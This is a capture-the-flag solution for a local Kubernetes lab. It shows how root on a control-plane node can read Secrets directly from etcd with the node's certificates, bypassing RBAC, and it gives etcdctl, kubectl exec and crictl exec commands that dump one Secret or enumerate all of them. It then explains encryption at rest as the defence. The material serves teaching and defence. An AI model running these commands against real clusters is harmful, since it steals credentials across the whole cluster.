# Solution — Straight From etcd

The flag is `KUBE{etcd_plaintext_bypasses_rbac}`. Below is the primary node path, a guaranteed fallback when `etcdctl` isn't on the node's `PATH`, the failure modes, and the one control that defeats all of it.

## Step 0 — you are "on the node"

In kind, the control-plane node is a container. Dropping into it is the node compromise this challenge assumes you already achieved:

```bash
docker exec -it dojo-control-plane bash
# you are now root on the "node" — the API server, etcd, and all their certs live here
```

Everything below can run inside that shell, or in one shot with `docker exec dojo-control-plane sh -c '...'` from your Mac. No kubeconfig, no token, no RBAC — only files on the node.

## Step 1 — confirm etcd's certs are sitting right there

```bash
docker exec dojo-control-plane ls -l /etc/kubernetes/pki/etcd/
# ca.crt  ca.key  healthcheck-client.crt  peer.crt  peer.key  server.crt  server.key ...
```

kubeadm (and kind) generate these so the API server can talk to etcd over mTLS. On the node they are unprotected files — whoever holds them *is* an etcd client.

## Step 2 — read the Secret straight from etcd

```bash
docker exec dojo-control-plane sh -c 'ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/dojo-etcd/vault-backup' | strings | grep KUBE
# -> FLAG=KUBE{etcd_plaintext_bypasses_rbac}  (plus the surrounding protobuf noise)
```

What happened:

- `get /registry/secrets/dojo-etcd/vault-backup` pulls the raw stored object. etcd returns the key line, then the value: a protobuf blob beginning with the bytes `k8s\x00`.
- `strings` extracts printable runs from that binary blob; `grep KUBE` isolates the flag. You never parsed protobuf — you didn't need to, because the credential is **right there in cleartext**.

To see the decoy alongside it and prove the whole Secret is exposed:

```bash
docker exec dojo-control-plane sh -c 'ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/dojo-etcd/vault-backup' | strings | grep -E 'FLAG|AWS|AKIA'
```

Enumerate *every* Secret in the cluster the same way — this is why node access is total:

```bash
docker exec dojo-control-plane sh -c 'ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/ --prefix --keys-only'
```

## Fallback — when `etcdctl` isn't on the node's PATH

Some node images don't ship `etcdctl` on the host. It always exists inside the etcd **static-pod container image**, which mounts the same certs at the same paths. Go through the kubelet/runtime instead:

```bash
# via the API server (still a legit path once you're on the node — the etcd pod has etcdctl):
kubectl -n kube-system exec etcd-dojo-control-plane -- sh -c 'ETCDCTL_API=3 etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/dojo-etcd/vault-backup' | strings | grep KUBE

# or drop to the container runtime directly on the node, no API server at all:
docker exec dojo-control-plane sh -c \
  'crictl ps --name etcd -q | head -n1 | xargs -I{} crictl exec {} sh -c "ETCDCTL_API=3 etcdctl \
   --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt \
   --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets/dojo-etcd/vault-backup"' \
  | strings | grep KUBE
```

The `crictl exec` route is the purest demonstration: it reaches etcd without the API server even being involved.

## Common failure modes

| What you see | Cause | Fix |
|--------------|-------|-----|
| `etcdctl: not found` | No `etcdctl` on the node host PATH | Use the fallback: exec into the `etcd-dojo-control-plane` pod, or `crictl exec` the etcd container |
| Empty output / no `KUBE` line | `ETCDCTL_API=3` missing → v2 API queried, or wrong namespace/name in the key | Keep `ETCDCTL_API=3`; verify the path is `/registry/secrets/dojo-etcd/vault-backup` |
| `context deadline exceeded` / `connection refused` | Pointing at the wrong endpoint, or etcd listens only on `127.0.0.1:2379` | Run *inside* the node (default endpoint is already `127.0.0.1:2379`); don't add a remote `--endpoints` |
| `remote error: tls: bad certificate` | Used the wrong cert pair (e.g. `peer.*` or `healthcheck-client.*`) | Use `server.crt`/`server.key` with `ca.crt` as shown |
| Only the decoy `AKIA...` shows | You filtered too narrowly | `grep KUBE`, or widen to `grep -E 'FLAG\|KUBE'` |

> **War story.** A platform team rotated their database password after a suspected pod compromise, patched the app, and closed the incident — the breached pod's ServiceAccount had `get secrets` in one namespace, so they rotated that namespace's Secrets and moved on. What the timeline missed: the same intrusion had briefly landed on a control-plane node through a misconfigured debug `hostPath` mount. etcd had no encryption-at-rest. The attacker didn't need `get secrets` on anything — they'd already copied `/var/lib/etcd` wholesale, which is *every* Secret in *every* namespace, cluster-admin tokens included. Rotating one namespace was treating a scratch when the whole datastore had walked out the door. The lesson the postmortem burned in: **a node compromise is a full-cluster secret compromise unless etcd is encrypted at rest** — scope your blast-radius assessment to the datastore, not to what RBAC would have allowed.

## The defense — encryption at rest (and guard the node)

RBAC can't help here; it's an API-server control and etcd never sees it. The control that *does* work is **encryption at rest**: configure the API server with an `EncryptionConfiguration` so Secrets are enciphered before they're written to etcd.

```yaml
# /etc/kubernetes/enc/encryption-config.yaml  (referenced by the API server's
# --encryption-provider-config flag). Prefer a real KMS provider in production;
# aescbc with a locally-held key is the minimum viable step up from plaintext.
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded 32-byte key>   # head -c 32 /dev/urandom | base64
      - identity: {}   # fallback for reads of not-yet-encrypted data; must NOT be first
```

After enabling it, **re-write existing Secrets so they get encrypted** (new config only encrypts future writes):

```bash
kubectl get secrets --all-namespaces -o json | kubectl replace -f -
```

Now repeat Step 2. Instead of the plaintext flag you'll see a value prefixed `k8s:enc:aescbc:v1:key1:` followed by ciphertext — `strings | grep KUBE` returns **nothing**. That empty output is the control working: the node attacker now holds bytes they can't read without the KMS key.

Layer the rest of defense-in-depth on top, because encryption at rest only protects the *data*, not the node:

- **Treat the control-plane node and `/etc/kubernetes/pki` as crown jewels.** Node access is cluster-admin-equivalent regardless of RBAC. Minimize who/what can reach it; no workloads scheduled there.
- **Keep a KMS key off the node** (external KMS provider) so even a full `/var/lib/etcd` + node-filesystem copy can't decrypt without calling the KMS — which you can revoke.
- **Rotate everything after a node compromise.** If an unencrypted etcd was ever exposed, assume every Secret leaked. From this challenge's vantage point, it did.
